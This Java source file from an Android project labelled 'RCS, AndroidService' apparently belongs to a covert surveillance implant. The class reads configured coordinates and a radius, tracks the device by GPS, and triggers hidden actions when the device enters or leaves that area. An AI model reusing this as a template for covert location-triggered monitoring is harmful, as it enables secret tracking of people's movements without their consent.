/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventLocation.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.agent.position.GPSLocator;
import com.android.service.agent.position.GPSLocatorDistance;
import com.android.service.agent.position.RangeObserver;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

public class EventLocation extends EventBase implements RangeObserver {

	private static final String TAG = "EventLocation"; //$NON-NLS-1$
	int actionOnEnter;
	int actionOnExit;

	int distance;
	float latitudeOrig;
	float longitudeOrig;
	GPSLocator locator;

	@Override
	public void begin() {
		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
		locator.start();
	}

	@Override
	public void end() {
		locator.halt();
		try {
			locator.join();
		} catch (final InterruptedException e) {

			if (Cfg.DEBUG) {
				Check.log(e) ;//$NON-NLS-1$
			}
		}
		locator = null;
	}

	@Override
	public boolean parse(EventConf eventConf) {
		final byte[] confParams = eventConf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);

		try {
			actionOnEnter = eventConf.getAction();
			actionOnExit = databuffer.readInt();

			distance = databuffer.readInt();

			latitudeOrig = (float) databuffer.readDouble();
			longitudeOrig = (float) databuffer.readDouble();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}
		} catch (final IOException ex) {
			return false;
		}

		return true;
	}

	@Override
	public void go() {
	}

	public int notification(Boolean onEnter) {
		if (onEnter) {
			trigger(actionOnEnter);
		} else {
			trigger(actionOnExit);
		}

		return 0;
	}

}
